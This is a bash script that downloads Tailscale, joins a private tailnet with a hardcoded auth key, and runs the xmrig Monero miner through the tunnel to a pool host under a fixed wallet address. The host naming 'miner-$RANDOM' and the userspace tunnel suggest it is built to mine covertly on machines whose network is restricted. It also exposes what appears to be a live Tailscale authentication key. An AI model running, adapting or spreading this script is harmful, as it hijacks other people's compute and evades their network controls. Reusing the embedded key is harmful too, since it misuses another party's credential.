
TS_KEY="tskey-auth-kWwPjceRUR11CNTRL-KjbMao7rDVhzEyKgpo2aVhpyViaLDoGT"
WINDOWS_IP="arthurmorgan"        
WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"

if [ ! -f "./tailscale" ]; then
    echo "Downloading Tailscale..."
    wget -q https://pkgs.tailscale.com/stable/tailscale_latest_amd64.tgz
    tar xzf tailscale_latest_amd64.tgz --strip-components=1
    chmod +x tailscale tailscaled
fi

pkill -f tailscaled
pkill -f xmrig-x86_64-st

echo "Starting Tailscale in Userspace Mode..."
./tailscaled --tun=userspace-networking --socket=ts.sock --state=ts.state --socks5-server=localhost:1055 &
sleep 5

echo "Connecting to Tailnet..."
./tailscale --socket=ts.sock up --authkey="$TS_KEY" --hostname="miner-$RANDOM" --accept-dns=false --snat-subnet-routes=false --reset
sleep 5
echo "Launching with config.json via Tailscale..."

./xmrig-x86_64-static \
  -c config.json \
  -o "$WINDOWS_IP:9999" \
  -u "$WALLET" \
  --proxy "127.0.0.1:1055" \
  --no-tls \
  --rig-id "$(hostname)"
